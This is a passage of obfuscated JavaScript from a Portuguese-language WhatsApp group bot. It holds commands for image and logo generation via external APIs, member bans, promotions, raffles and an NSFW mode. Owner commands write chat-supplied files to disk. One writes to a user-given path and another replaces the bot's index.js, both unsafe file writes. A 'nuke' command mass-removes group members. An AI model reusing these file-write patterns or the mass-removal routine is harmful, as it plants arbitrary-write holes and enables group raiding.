                buff = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
                const _0x21b1fd = {
                  image: buff
                };
                const _0x3e4aae = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x21b1fd, _0x3e4aae).catch(_0x6a7381 => {
                  console.log(_0x6a7381);
                  _0x403602("ERRO!!");
                });
              } catch {
                _0x403602("" + infoerror);
              }
              break;
            case "placaloli":
              if (!_0x1d6557) {
                return _0x403602("poe algo na frente ex\n" + (prefixo + _0x3dec88) + " xbot");
              }
              _0x403602(enviar.espere);
              if (_0x3fb600) {
                setTimeout(async () => {
                  _0x4b05d2(1, _0x32e455);
                }, 1000);
              }
              lod = await fetchJson(SITE_JEFF_APIS + "/api/sticker/placaloli?nome=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
              _0x5b87bd(_0x4f1071, lod.resultado);
              break;
            case "logos1":
              if (!_0x1d6557) {
                return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " Aleatory");
              }
              var _0x1e94db = ["shadow", "metalgold", "cup", "txtborboleta", "cemiterio", "efeitoneon", "harryp", "lobometal", "neon2", "madeira", "lovemsg3", "coffecup", "coffecup2", "florwooden", "narutologo", "fire", "romantic", "smoke", "papel", "lovemsg", "lovemsg2", "fiction", "3dstone", "areia", "style", "blood", "pink", "cattxt", "neondevil", "carbon", "metalfire", "thunder", "vidro", "jokerlogo", "transformer", "demonfire", "jeans", "metalblue", "natal", "ossos", "asfalto", "break", "glitch2", "colaq", "neon3", "nuvem", "horror", "matrix", "berry", "luxury", "lava", "thunderv2", "neongreen", "neve", "neon", "neon1", "neon3d", "gelo", "neon3", "3dgold", "lapis", "toxic", "demongreen", "rainbow", "halloween", "angelwing", "hackneon", "fpsmascote", "equipemascote", "txtquadrinhos", "ffavatar", "mascotegame", "angelglx", "gizquadro", "wingeffect", "blackpink", "girlmascote", "logogame"];
              var _0xfaf354 = [];
              for (var _0x1c0998 = 0; _0x1c0998 < _0x1e94db.length; _0x1c0998++) {
                _0xfaf354.push({
                  title: _0x1e94db[_0x1c0998],
                  description: "Logo personalizadas: " + (_0x1c0998 + 1),
                  rowId: _0x1d93be + _0x1e94db[_0x1c0998] + (" " + _0x1d6557)
                });
              }
              _0x26c9b5(_0x4f1071, "Texto: " + _0x1d6557, "Diversas logos", "Escolha a qual desejar", "Clique aqui..", "Logos top..", _0xfaf354);
              break;
            case "angelwing":
            case "hackneon":
            case "fpsmascote":
            case "equipemascote":
            case "txtquadrinhos":
            case "ffavatar":
            case "mascotegame":
            case "angelglx":
            case "gizquadro":
            case "wingeffect":
            case "blackpink":
            case "girlmascote":
            case "logogame":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Digite algo, Exemplo: " + (_0x1d93be + _0x3dec88) + " xbot");
                }
                _0x403602(enviar.espere);
                ABC = await fetchJson(SITE_JEFF_APIS + "/api/" + _0x3dec88 + "?texto=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x2e284c = {
                  url: ABC.resultado.imageUrl
                };
                const _0x4c2311 = {
                  image: _0x2e284c
                };
                const _0x100038 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x4c2311, _0x100038).catch(() => {
                  return _0x403602("" + infoerror);
                });
              } catch (_0x21557d) {
                return _0x403602("Erro...");
              }
              break;
            case "fiction":
            case "3dstone":
            case "areia":
            case "style":
            case "blood":
            case "pink":
            case "cattxt":
            case "neondevil":
            case "carbon":
            case "metalfire":
            case "thunder":
            case "vidro":
            case "jokerlogo":
            case "transformer":
            case "demonfire":
            case "jeans":
            case "metalblue":
            case "natal":
            case "ossos":
            case "asfalto":
            case "break":
            case "glitch2":
            case "colaq":
            case "neon3":
            case "nuvem":
            case "horror":
            case "matrix":
            case "berry":
            case "luxury":
            case "lava":
            case "thunderv2":
            case "neongreen":
            case "neve":
            case "neon":
            case "neon1":
            case "neon3d":
            case "gelo":
            case "neon3":
            case "3dgold":
            case "lapis":
            case "toxic":
            case "demongreen":
            case "rainbow":
            case "halloween":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Digite algo, Exemplo: " + (_0x1d93be + _0x3dec88) + " xbot");
                }
                _0x403602(enviar.espere);
                ABC = await fetchJson(SITE_JEFF_APIS + "/api/" + _0x3dec88 + "?texto=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0xae51fb = {
                  url: ABC.resultado
                };
                const _0x2b5d12 = {
                  image: _0xae51fb
                };
                const _0x403771 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x2b5d12, _0x403771).catch(() => {
                  return _0x403602("" + infoerror);
                });
              } catch (_0x266d70) {
                return _0x403602("Erro...");
              }
              break;
            case "shadow":
            case "metalgold":
            case "cup":
            case "txtborboleta":
            case "cemiterio":
            case "efeitoneon":
            case "harryp":
            case "lobometal":
            case "neon2":
            case "madeira":
            case "lovemsg3":
            case "coffecup":
            case "coffecup2":
            case "florwooden":
            case "narutologo":
            case "fire":
            case "romantic":
            case "smoke":
            case "papel":
            case "lovemsg":
            case "lovemsg2":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Digite algo, Exemplo: " + (_0x1d93be + _0x3dec88) + " xbot");
                }
                _0x403602(enviar.espere);
                ABC = await fetchJson(SITE_JEFF_APIS + "/api/" + _0x3dec88 + "?texto=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x45d06a = {
                  url: ABC.resultado.imageUrl
                };
                const _0x150663 = {
                  image: _0x45d06a
                };
                const _0x474ae3 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x150663, _0x474ae3).catch(_0x91970f => {
                  return _0x403602("" + infoerror);
                });
              } catch (_0x10062a) {
                return _0x403602("Erro...");
              }
              break;
            case "marvel":
            case "pornhub":
            case "space":
            case "stone":
            case "steel":
            case "grafity":
            case "glitch3":
            case "america":
              try {
                var [_0x43c7e3, _0x3d34a3] = _0x1d6557.split("/");
                if (!_0x1d6557.includes("/")) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " xbot/mdm");
                }
                _0x403602(enviar.espere);
                ABC = await fetchJson(SITE_JEFF_APIS + "/api/" + _0x3dec88 + "?texto=" + _0x43c7e3 + "&texto2=" + _0x3d34a3 + "&apikey=" + _0x512d5e);
                const _0x22468e = {
                  url: ABC.resultado
                };
                const _0x1c2163 = {
                  image: _0x22468e
                };
                const _0x49867a = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x1c2163, _0x49867a).catch(_0x473643 => {
                  return _0x403602("" + infoerror);
                });
              } catch (_0x21937f) {
                return _0x403602("Erro...");
              }
              break;
            case "metadinha":
              try {
                ABC = await fetchJson(SITE_JEFF_APIS + "/random/metadinha?apikey=" + _0x512d5e);
                if (!ABC || !ABC.masculina || !ABC.feminina) {
                  return _0x403602("Erro ao buscar as imagens. Avise ao meu criador 🥺");
                }
                const _0x3d2fc9 = {
                  url: ABC.masculina
                };
                const _0x244ea9 = {
                  image: _0x3d2fc9
                };
                await _0x263319.sendMessage(_0x4f1071, _0x244ea9).catch(() => {
                  return _0x403602("Erro ao buscar as imagens. Avise ao meu criador 🥺");
                });
                const _0x5de288 = {
                  url: ABC.feminina
                };
                const _0x10d1d5 = {
                  image: _0x5de288
                };
                await _0x263319.sendMessage(_0x4f1071, _0x10d1d5).catch(() => {
                  return _0x403602("Erro ao buscar as imagens. Avise ao meu criador 🥺");
                });
              } catch (_0x50d904) {
                return _0x403602("Erro ao buscar as imagens. Avise ao meu criador 🥺");
              }
              break;
            case "googlesg":
              try {
                _0x3fa54a = _0x40e45c.join(" ");
                _0x3a7079 = _0x3fa54a.split("/")[0];
                _0x137400 = _0x3fa54a.split("/")[1];
                txt3 = _0x3fa54a.split("/")[2];
                if (!_0x3fa54a) {
                  return _0x403602("Cade o texto?");
                }
                if (!_0x3fa54a.includes("/")) {
                  return _0x403602("Cade a / precisa dela para a separação..\nExemplo: " + (_0x1d93be + _0x3dec88) + " Game/Play/Sad");
                }
                _0x403602(enviar.espere);
                bla = await fetchJson("https://api.bronxyshost.com.br/api-bronxys/" + _0x3dec88 + "?texto=" + _0x3a7079 + "&texto2=" + _0x137400 + "&texto3=" + txt3 + "&apikey=" + _0x44a335);
                const _0x451218 = {
                  url: bla.resultado.imageUrl
                };
                const _0x10bf72 = {
                  image: _0x451218
                };
                const _0x5d841e = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x10bf72, _0x5d841e).catch(_0x5cd1ee => {
                  _0x403602("ERROR!!");
                });
              } catch (_0x1dc072) {
                if (JSON.stringify(_0x1dc072).includes(_0x44a335)) {
                  return console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x403602("ERROR!!");
                }
              }
              break;
            case "infosorteio":
            case "helpsorteio":
              const _0x31b9c6 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: _0x488ab3(_0x1d93be, _0x55a6ac)
              }, _0x31b9c6);
              break;
            case "substituir":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602("Só dono..");
              }
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x11898e) {
                media = _0x11898e ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : _0x302296.message.documentMessage;
                rane = getRandom("." + (await getExtension(media.mimetype)));
                doc = await getFileBuffer(media, "document");
                fs.writeFileSync(_0x1d6557, doc);
                const _0x59ac43 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  text: "Substituido com sucesso.."
                }, _0x59ac43);
              } else {
                _0x403602("Marque o documento ou arquivo..");
              }
              break;
            case "index-bot":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x11898e) {
                media = _0x11898e ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : _0x302296.message.documentMessage;
                if (media.fileName && media.fileName.toLowerCase() === "index.js") {
                  rane = getRandom("." + (await getExtension(media.mimetype)));
                  doc = await getFileBuffer(media, "document");
                  fs.writeFileSync("./index.js", doc);
                  const _0xb2a811 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "Pronto, o index foi atualizado."
                  }, _0xb2a811);
                } else {
                  _0x403602("Erro, esse arquivo nao e a index.js amigo -_-.");
                }
              } else {
                _0x403602("Marque o arquivo index.js para eu atualizar.");
              }
              break;
            case "menu-bot":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x11898e) {
                media = _0x11898e ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : _0x302296.message.documentMessage;
                if (media.fileName && media.fileName.toLowerCase() === "menus.js") {
                  rane = getRandom("." + (await getExtension(media.mimetype)));
                  doc = await getFileBuffer(media, "document");
                  fs.writeFileSync("./menus/menus/menus.js", doc);
                  const _0x59ac2d = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "Pronto, o menu.js foi atualizado."
                  }, _0x59ac2d);
                } else {
                  _0x403602("Erro, esse arquivo não e o menus.js amigo -_-.");
                }
              } else {
                _0x403602("Marque o arquivo menus.js para eu atualizar.");
              }
              break;
            case "segui-bot":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x11898e) {
                media = _0x11898e ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : _0x302296.message.documentMessage;
                rane = getRandom("." + (await getExtension(media.mimetype)));
                doc = await getFileBuffer(media, "document");
                fs.writeFileSync("./menus/menus/hospedar-heroku.js", doc);
                const _0x4766bc = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  text: "Pronto tabela de seguidores atualizado"
                }, _0x4766bc);
              } else {
                _0x403602("Marque o documento ou o arquivo que deseja enviar pra determinar pasta ou substituir..");
              }
              break;
            case "lib-bot":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x11898e) {
                media = _0x11898e ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : _0x302296.message.documentMessage;
                originalName = media.fileName || "file";
                ext = await getExtension(media.mimetype);
                doc = await getFileBuffer(media, "document");
                fs.writeFileSync("./lib/" + originalName, doc);
                const _0x31b36d = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  text: "Pronto módulo/scraper adicionado"
                }, _0x31b36d);
              } else {
                _0x403602("Marque o módulo/scraper que deseja enviar para Lib.");
              }
              break;
              ;
            case "countmsg-bot":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x11898e) {
                media = _0x11898e ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : _0x302296.message.documentMessage;
                rane = getRandom("." + (await getExtension(media.mimetype)));
                doc = await getFileBuffer(media, "document");
                fs.writeFileSync("./DADOS/countmsg.json", doc);
                const _0x40e189 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  text: "Pronto countmsg.json atualizada"
                }, _0x40e189);
              } else {
                _0x403602("Marque o documento ou o arquivo que deseja enviar pra determinar pasta ou substituir..");
              }
              break;
            case "bann":
              if (!_0x38b1b5 && !_0x2a5ff3) {
                return _0x403602("Só usuário premium pode utilizar este comando..");
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (!_0x1dcf0a || _0x5b0a24[1]) {
                return _0x403602("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
              }
              if (!JSON.stringify(_0x5b3ba6).includes(_0x1dcf0a)) {
                return _0x403602("Este usuário já foi removido ou saiu do grupo.");
              }
              if (premium.includes(_0x1dcf0a)) {
                return _0xd7aa55("@" + _0x1dcf0a.split("@")[0] + " a(o) @" + _0x32e455.split("@")[0] + " está querendo banir você, visualiza esse problema ae 😶", [_0x1dcf0a], true);
              }
              if (_0x2aa963.includes(_0x1dcf0a)) {
                return _0xd7aa55("@" + _0x1dcf0a.split("@")[0] + " a(o) @" + _0x32e455.split("@")[0] + " está querendo banir você, visualiza esse problema ae 😶", [_0x1dcf0a], true);
              }
              if (_0x2dd81a.includes(_0x1dcf0a)) {
                return _0x403602("Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você");
              }
              if (JSON.stringify(_0x27033e || numerodono_ofc).indexOf(_0x1dcf0a) >= 0) {
                return _0x403602("Não posso remover meu dono 🤧");
              }
              _0x263319.sendMessage(_0x4f1071, {
                text: "@" + _0x1dcf0a.split("@")[0] + " Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos ainda não esclarecidos) -",
                mentions: [_0x1dcf0a]
              });
              _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x1dcf0a], "remove");
              break;
            case "band":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              try {
                if (!_0x1dcf0a || _0x5b0a24[1]) {
                  return _0x403602("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
                }
                if (_0x326231) {
                  setTimeout(() => {
                    _0x263319.sendMessage(_0x4f1071, {
                      delete: {
                        remoteJid: _0x4f1071,
                        fromMe: false,
                        id: _0x302296.key.id,
                        participant: _0x32e455
                      }
                    });
                  }, 500);
                }
                if (JSON.stringify(_0x27033e || numerodono_ofc).indexOf(_0x1dcf0a) >= 0) {
                  return _0x403602("Não posso remover meu dono 🤧");
                }
                if (_0x2dd81a.includes(_0x1dcf0a)) {
                  return _0x403602("Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você");
                }
                if (_0x27033e.includes(_0x1dcf0a)) {
                  return _0x403602("Não posso remover meu dono 🤧");
                }
                _0x263319.sendMessage(_0x4f1071, {
                  text: "@" + _0x1dcf0a.split("@")[0] + " Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -",
                  mentions: [_0x1dcf0a]
                });
                _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x1dcf0a], "remove");
              } catch (_0x31c4f1) {
                console.log(_0x31c4f1);
              }
              break;
            case "ban":
            case "banir":
            case "kick":
            case "avadakedavra":
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              try {
                if (!_0x1dcf0a || _0x5b0a24[1]) {
                  return _0x403602("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
                }
                if (!JSON.stringify(_0x5b3ba6).includes(_0x1dcf0a)) {
                  return _0x403602("Este usuário já foi removido do grupo ou saiu.");
                }
                if (_0x2dd81a.includes(_0x1dcf0a)) {
                  return _0x403602("Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você");
                }
                if (JSON.stringify(_0x27033e || numerodono_ofc).indexOf(_0x1dcf0a) >= 0) {
                  return _0x403602("Não posso remover meu dono 🤧");
                }
                _0x263319.sendMessage(_0x4f1071, {
                  text: "@" + _0x1dcf0a.split("@")[0] + " Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -",
                  mentions: [_0x1dcf0a]
                });
                _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x1dcf0a], "remove");
              } catch (_0x352588) {
                console.log(_0x352588);
              }
              break;
            case "promover":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (!_0x1dcf0a || _0x5b0a24[1]) {
                return _0x403602("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
              }
              if (!JSON.stringify(_0x5b3ba6).includes(_0x1dcf0a)) {
                return _0x403602("Este usuário foi removido do grupo ou saiu, não será possível promover..");
              }
              let _0x3b2d4e;
              if (fs.existsSync("./DADOS/grupos/grupo_" + _0x4f1071 + ".json")) {
                _0x3b2d4e = carregarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json");
              } else {
                const _0x10d792 = {
                  protecaoAtivada: false,
                  donos: []
                };
                _0x3b2d4e = _0x10d792;
              }
              if (_0x3b2d4e.protecaoAtivada && !_0x3b2d4e.donos.includes(_0x32e455) && _0x150e9e) {
                await delay(3000);
                await _0x263319.sendMessage(_0x4f1071, {
                  text: "\n⚠️ ALERTA ADMINISTRADORES ⚠️\n\n👤 ADM PROMOVIDO:\n@" + _0x1dcf0a.split("@")[0] + "\n\n😎 PELO ADM @" + _0x32e455.split("@")[0] + "\n\n🚨 AVISO: Este administrador foi rebaixado automaticamente por tentar promover outro membro sem permissão. Como resultado, ambos foram rebaixados.\n\n👨‍✈️ Admin responsável:\n@" + _0x32e455.split("@")[0] + "\n",
                  mentions: [_0x1dcf0a, _0x32e455, ..._0x2aa963]
                });
                await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "demote");
              } else {
                _0x263319.sendMessage(_0x4f1071, {
                  text: "@" + _0x1dcf0a.split("@")[0] + " Foi promovido(a) para adm com sucesso.",
                  mentions: [_0x1dcf0a]
                });
                _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x1dcf0a], "promote");
              }
              break;
            case "rebaixar":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (!_0x1dcf0a || _0x5b0a24[1]) {
                return _0x403602("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
              }
              if (!JSON.stringify(_0x5b3ba6).includes(_0x1dcf0a)) {
                return _0x403602("Este usuário foi removido do grupo ou saiu, não será possível rebaixar..");
              }
              if (JSON.stringify(_0x27033e || numerodono_ofc).indexOf(_0x1dcf0a) >= 0) {
                return _0x403602("Não posso rebaixar meu dono 🤧");
              }
              let _0x391bd1;
              if (fs.existsSync("./DADOS/grupos/grupo_" + _0x4f1071 + ".json")) {
                _0x391bd1 = carregarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json");
              } else {
                const _0x2e236f = {
                  protecaoAtivada: false,
                  donos: []
                };
                _0x391bd1 = _0x2e236f;
              }
              if (_0x391bd1.protecaoAtivada && !_0x391bd1.donos.includes(_0x32e455) && _0x150e9e) {
                await delay(3000);
                await _0x263319.sendMessage(_0x4f1071, {
                  text: "\n⚠️ ALERTA ADMINISTRADORES ⚠️\n\n👤 TENTATIVA DE REMOÇÃO DE CARGO DO(A) ADM:\n@" + _0x1dcf0a.split("@")[0] + "\n\n😎 PELO ADM @" + _0x32e455.split("@")[0] + "\n\n🚨 AVISO: Este administrador foi rebaixado automaticamente por tentar rebaixar outro membro sem permissão. Como resultado, ambos foram rebaixados.\n\n👨‍✈️ Admin responsável:\n@" + _0x32e455.split("@")[0] + "\n",
                  mentions: [_0x1dcf0a, _0x32e455, ..._0x2aa963]
                });
                await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "demote");
              } else {
                _0x263319.sendMessage(_0x4f1071, {
                  text: "@" + _0x1dcf0a.split("@")[0] + " Foi Rebaixado para [ MEMBRO COMUM ] com sucesso.",
                  mentions: [_0x1dcf0a]
                });
                _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x1dcf0a], "demote");
              }
              break;
            case "sorteio":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              try {
                if (!_0xd20756) {
                  return _0x403602(_0x270bdf);
                }
                if (!_0x1d6557) {
                  return _0x403602("Coloque algo, após o comando sorteio, por exemplo, " + _0x1d93be + "sorteio de 100 R$");
                }
                dd = [];
                teksu = "🎉Parabéns, por ganhar o sorteio " + _0x1d6557 + ":\n\n";
                for (_0xc3d45a = 0; _0xc3d45a < 1; _0xc3d45a++) {
                  ery = Math.floor(Math.random() * _0xf7f183.participants.length + 0);
                  teksu += "🔥፝⃟\xA0\xA0➣ @" + _0x5b3ba6[ery].id.split("@")[0] + "\n";
                  dd.push(_0x5b3ba6[ery].id);
                }
                _0xd7aa55(teksu, dd, true);
              } catch (_0x1ef41d) {
                console.log(_0x1ef41d);
                _0x403602("Deu erro, tente novamente :/");
              }
              break;
            case "nuke":
            case "arquivargp":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602("Só dono pode utilizar este comando...");
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x302296.key.fromMe) {
                return;
              }
              blup = [];
              for (_0xc3d45a of _0x5b3ba6) {
                if (!_0x27033e.includes(_0xc3d45a.id)) {
                  blup.push(_0xc3d45a.id);
                }
              }
              blup.splice(blup.indexOf(_0x2dd81a), 1);
              for (_0xc3d45a = 0; _0xc3d45a < blup.length; _0xc3d45a++) {
                await sleep(500);
                _0x263319.groupParticipantsUpdate(_0x4f1071, [blup[_0xc3d45a]], "remove");
              }
              break;
            case "sorteionumero":
            case "sorteionumeros":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              try {
                if (!_0xd20756) {
                  return _0x403602(_0x270bdf);
                }
                if (!_0x1d6557) {
                  return _0x403602("Coloque algo, após o comando sorteio, por exemplo, " + _0x1d93be + "sorteionumero de 100 R$");
                }
                var _0x35e1a1 = _0x5889b0[Math.floor(Math.random() * _0x5889b0.length)];
                d = [];
                teks = "🎉Parabéns ao número do sortudo, por ganhar o sorteio " + _0x1d6557 + ":\n\n";
                for (_0xc3d45a = 0; _0xc3d45a < 1; _0xc3d45a++) {
                  teks += "🔥፝⃟\xA0\xA0➣ " + _0x35e1a1 + "\n";
                  d.push(_0x35e1a1);
                }
                _0xd7aa55(teks, d, true);
              } catch (_0x53c4f0) {
                console.log(_0x53c4f0);
                _0x403602("Deu erro, tente novamente :/");
              }
              break;
            case "attp":
            case "attp2":
            case "attp3":
            case "attp4":
            case "attp5":
            case "attp6":
            case "attp7":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " sad");
                }
                _0x403602(enviar.espere);
                console.log("Esta faltando o texto:", _0x1d6557);
                const _0x20bd7f = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  sticker: {
                    url: SITE_JEFF_APIS + "/api/" + _0x3dec88 + "?texto=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e
                  }
                }, _0x20bd7f).catch(_0x5d1e96 => {
                  console.error("Erro na função 'attp':", _0x5d1e96);
                  return _0x403602("" + infoerror);
                });
              } catch (_0x688da1) {
                console.error("Erro na função 'attp':", _0x688da1);
                return _0x403602("" + infoerror);
              }
              break;
            case "ttp2":
              try {
                _0x403602(enviar.espere);
                string = _0x40e45c.join(" ") || "Cade o texto fih de deus?";
                post = SITE_JEFF_APIS + "/api/ttp?texto=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e;
                const _0x249032 = {
                  quoted: _0x302296
                };
                _0x5b87bd(_0x4f1071, post, _0x249032);
              } catch (_0x262fe0) {
                if (String(_0x262fe0).includes("invalid json response body at")) {
                  console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x403602("ERROR!!");
                }
              }
              break;
            case "ttp3":
              try {
                _0x403602(enviar.espere);
                string = _0x40e45c.join(" ") || "Cade o texto fih de deus?";
                cu = SITE_JEFF_APIS + "/api/ttp2?q=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e;
                const _0x2abfe8 = {
                  quoted: _0x302296
                };
                _0x5b87bd(_0x4f1071, cu, _0x2abfe8);
              } catch (_0x5296b7) {
                if (String(_0x5296b7).includes("invalid json response body at")) {
                  console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x403602("ERROR!!");
                }
              }
              break;
            case "ttp4":
              try {
                _0x403602(enviar.espere);
                string = _0x40e45c.join(" ") || "Cade o texto fih de deus?";
                pussy = SITE_JEFF_APIS + "/api/ttp3?q=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e;
                const _0x288711 = {
                  quoted: _0x302296
                };
                _0x5b87bd(_0x4f1071, pussy, _0x288711);
              } catch (_0x11fa5d) {
                if (String(_0x11fa5d).includes("invalid json response body at")) {
                  console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x403602("ERROR!!");
                }
              }
              break;
            case "modonsfw":
            case "nsfw":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Hmmmm");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x4c8b57) {
                  return _0x403602("O modo nsfw já está ativo");
                }
                nsfw.push(_0x4f1071);
                fs.writeFileSync("./DADOS/usuarios/grupos/nsfw.json", JSON.stringify(nsfw));
                _0x403602("```✓Ativado com sucesso o modo nsfw +18 no grupo``` *" + _0xf7f183.subject + "*");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x4c8b57 && !_0x35021e && !_0x2a5ff3) {
                  return _0x403602("O modo nsfw já está Desativado");
                }
                nsfw.splice(_0x4f1071, 1);
                fs.writeFileSync("./DADOS/usuarios/grupos/nsfw.json", JSON.stringify(nsfw));
                _0x403602("```✓Modo Nsfw +18 desativado com sucesso no grupo``` *" + _0xf7f183.subject + "*");
              } else {
                _0x403602("1 para ativar, 0 para desligar");
              }
              break;
            case "gerarnick2":
            case "fazernick2":
              try {
                if (ANT_LTR_MD_EMJ(_0x1d6557)) {
                  return _0x403602("Não pode letras modificadas nem emoji..");
                }
                if (!_0x1d6557) {
                  return _0x403602("Escreveva um nome para eu enviar ele com letras modificadas, Exemplo: " + (_0x1d93be + _0x3dec88) + " jeff");
                }
                ABC = await fetchJson("https://api.bronxyshost.com.br/api-bronxys/gerar_nick?nick=" + _0x1d6557 + "&apikey=" + _0x44a335);
                _0x3529b0 = "Lista com base no Nick informado, para encontrar melhor fonte para utilizar:\n\n";
                for (_0xc3d45a of ABC) {
                  _0x3529b0 += _0xc3d45a + "\n\n";
                }
                _0x403602(_0x3529b0);
              } catch (_0x1cd0c9) {
                return _0x403602("" + infoerror);
              }
              break;
            case "fazernick":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome");
                }
                const _0x2fd1cd = await fetchJson(SITE_JEFF_APIS + "/api/fazernick?nome=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x54eac0 = _0x2fd1cd.slice(0, 36).map((_0xd4752e, _0x2f6e41) => ({
                  id: _0x1d93be + "88738 " + _0xd4752e,
                  header: "",
                  title: _0xd4752e,
                  description: ""
                }));
                if (botoes_) {
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: {
                        text: "GERADOR DE NICKS:\n"
                      },
                      footer: {
                        text: "> Nicks gerados"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "NICKS GERADOS",
                            sections: [{
                              title: "Escolha uma opção:",
                              rows: _0x54eac0
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  _0x3529b0 = "Lista com base no Nick informado, para encontrar melhor fonte para utilizar:\n\n";
